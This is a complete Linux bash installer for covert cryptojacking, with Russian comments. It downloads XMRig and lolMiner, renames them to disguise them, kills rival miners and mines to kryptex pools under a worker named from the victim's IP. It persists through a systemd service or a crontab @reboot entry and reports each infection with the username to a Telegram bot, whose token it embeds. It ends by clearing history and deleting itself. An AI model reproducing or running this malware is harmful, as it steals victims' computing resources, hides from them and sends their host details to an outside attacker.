#!/bin/bash
FIXED_WALLET_ID="krxYNV2DZQ"
TG_BOT_TOKEN="8329784400:AAEtzySm1UTFIH-IqhAMUVNL5JLQhTlUOGg"
TG_CHAT_ID="7032066912"

POOL_CPU_1="xmr.kryptex.network:7777"
POOL_CPU_2="xmr-eu.kryptex.network:7777"
POOL_GPU_1="etc.kryptex.network:7033"
POOL_GPU_2="etc-eu.kryptex.network:7033"

if [ "$(id -u)" -eq 0 ]; then
    BASE_DIR="/usr/share/connfy-core"
    IS_ROOT=1
else
    BASE_DIR="$HOME/.connfy-core"
    IS_ROOT=0
fi

# Имена бинарников
BIN_CPU="connfy_manager" 
BIN_GPU="connfy_render"

# [ ССЫЛКИ ]
URL_XMRIG="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"
URL_LOLMINER="https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.98a/lolMiner_v1.98a_Lin64.tar.gz"

# ----------------------------------------------------
# [ ФАЗА 1: ГЕНЕРАЦИЯ ВОРКЕРА И ОЧИСТКА ]
# ----------------------------------------------------

# Получаем IP и убираем точки (192.168.0.1 -> 19216801)
get_worker() {
    local ip=$(curl -s -m 5 ifconfig.me || wget -qO- -t 1 ifconfig.me)
    # Удаляем все точки, оставляем только цифры
    local safe_ip=$(echo "$ip" | tr -d '.') 
    if [ -z "$safe_ip" ]; then safe_ip="888888"; fi
    # Формат: krxYNV2DZQ.123456
    echo "${FIXED_WALLET_ID}.${safe_ip}"
}
WORKER=$(get_worker)
echo "⚡ TARGET ID: $WORKER"

mkdir -p "$BASE_DIR"

# Убиваем конкурентов
TARGETS=("xmrig" "lolminer" "rigel" "t-rex" "nbminer" "minerd")
for t in "${TARGETS[@]}"; do
    pkill -9 -f "$t" >/dev/null 2>&1
done

# Чистим свои старые процессы, если они есть
pkill -f "$BIN_CPU"
pkill -f "$BIN_GPU"

# ----------------------------------------------------
# [ ФАЗА 2: УСТАНОВКА ЯДРА ]
# ----------------------------------------------------
cd "$BASE_DIR" || exit

# --- CPU SETUP ---
if [ ! -f "$BIN_CPU" ]; then
    echo "[+] Fetching CPU core..."
    curl -L -k -s -o cpu.tar.gz "$URL_XMRIG" || wget -qO cpu.tar.gz "$URL_XMRIG"
    tar -xf cpu.tar.gz
    FOUND_CPU=$(find . -type f -name "xmrig" | head -n 1)
    if [ -n "$FOUND_CPU" ]; then
        mv "$FOUND_CPU" "./$BIN_CPU"
        chmod +x "./$BIN_CPU"
    fi
    rm -rf cpu.tar.gz xmrig*
fi

# Конфиг JSON для XMRig
cat <<EOF > config.json
{
    "api": { "id": null, "worker-id": null },
    "http": { "enabled": false },
    "autosave": true,
    "background": false,
    "colors": false,
    "cpu": { "enabled": true, "huge-pages": true, "asm": true },
    "donate-level": 1,
    "pools": [
        { "url": "$POOL_CPU_1", "user": "$WORKER", "pass": "x", "keepalive": true },
        { "url": "$POOL_CPU_2", "user": "$WORKER", "pass": "x", "keepalive": true }
    ]
}
EOF

# --- GPU SETUP ---
# Пробуем качать лолмайнер только если lspci нет (значит контейнер урезан) ИЛИ если nvidia есть
if ! command -v lspci &> /dev/null || lspci | grep -i "nvidia" > /dev/null; then
    if [ ! -f "$BIN_GPU" ]; then
        echo "[+] Fetching GPU core..."
        curl -L -k -s -o gpu.tar.gz "$URL_LOLMINER" || wget -qO gpu.tar.gz "$URL_LOLMINER"
        tar -xf gpu.tar.gz
        FOUND_GPU=$(find . -type f -name "lolMiner" | head -n 1)
        if [ -n "$FOUND_GPU" ]; then
            mv "$FOUND_GPU" "./$BIN_GPU"
            chmod +x "./$BIN_GPU"
        fi
        rm -rf gpu.tar.gz 1.98a
    fi
fi

# ----------------------------------------------------
# [ ФАЗА 3: УМНЫЙ ЗАПУСК (SYSTEMD vs BACKGROUND) ]
# ----------------------------------------------------

# Функция генерации скриптов запуска
create_runners() {
    # Скрипт запуска CPU
    echo "#!/bin/bash" > run_cpu.sh
    echo "cd $BASE_DIR" >> run_cpu.sh
    # nohup нужен внутри скрипта для защиты от закрытия родителя
    echo "exec ./$BIN_CPU --config=config.json" >> run_cpu.sh
    chmod +x run_cpu.sh

    # Скрипт запуска GPU
    if [ -f "$BIN_GPU" ]; then
        echo "#!/bin/bash" > run_gpu.sh
        echo "cd $BASE_DIR" >> run_gpu.sh
        echo "exec ./$BIN_GPU --algo ETC --pool $POOL_GPU_1 --user $WORKER --pool $POOL_GPU_2 --user $WORKER --nocolor --watchdog exit" >> run_gpu.sh
        chmod +x run_gpu.sh
    fi
}
create_runners

# ПРОВЕРКА SYSTEMD
SYSTEMD_ACTIVE=0
if [ "$IS_ROOT" -eq 1 ] && [ -d "/run/systemd/system" ] && ps -p 1 -o comm= | grep -q "systemd"; then
    SYSTEMD_ACTIVE=1
fi

if [ "$SYSTEMD_ACTIVE" -eq 1 ]; then
    echo "[+] Systemd detected. Installing services..."
    # -- (Код установки сервисов systemd опущен, он такой же, но добавим сюда на всякий случай, если машина нормальная) --
    cat <<EOF > /etc/systemd/system/connfy-cpu.service
[Unit]
Description=Connfy Manager
After=network.target
[Service]
ExecStart=$BASE_DIR/run_cpu.sh
Restart=always
User=root
[Install]
WantedBy=multi-user.target
EOF
    systemctl enable connfy-cpu >/dev/null 2>&1
    systemctl start connfy-cpu
else
    # --- ВАРИАНТ ДЛЯ DOCKER / WSL / NO-SYSTEMD ---
    echo "[!] Systemd unavailable (Container/WSL?). Using FORCE EXECUTION."
    
    # Запускаем через nohup, перенаправляя вывод в /dev/null и отвязывая амперсандом
    nohup $BASE_DIR/run_cpu.sh >/dev/null 2>&1 &
    
    if [ -f "$BASE_DIR/run_gpu.sh" ]; then
        nohup $BASE_DIR/run_gpu.sh >/dev/null 2>&1 &
    fi
    
    # Пробуем добавить в Crontab (на всякий случай, если контейнер перезапустят, а крон там есть)
    (crontab -l 2>/dev/null; echo "@reboot $BASE_DIR/run_cpu.sh") | crontab -
fi

# ----------------------------------------------------
# [ ФАЗА 4: ФИНАЛИЗАЦИЯ ]
# ----------------------------------------------------

# Отправляем инфу
send_tg() {
    local method="Unknown"
    if [ "$SYSTEMD_ACTIVE" -eq 1 ]; then method="Systemd Service"; else method="Background Process (Container)"; fi
    
    MSG="🔥 <b>GOD MODE: INJECTION SUCCESS</b> %0A👤 <b>User:</b> $(whoami)%0A🆔 <b>ID:</b> $WORKER%0A⚙️ <b>Method:</b> $method"
    
    # Тихо отправляем
    curl -s -X POST "https://api.telegram.org/bot$TG_BOT_TOKEN/sendMessage" -d chat_id="$TG_CHAT_ID" -d text="$MSG" -d parse_mode="HTML" > /dev/null 2>&1
}

send_tg

echo "[+] Execution complete. Process detaching."
history -c
rm -f "$0" # Самоудаление установщика
exit 0
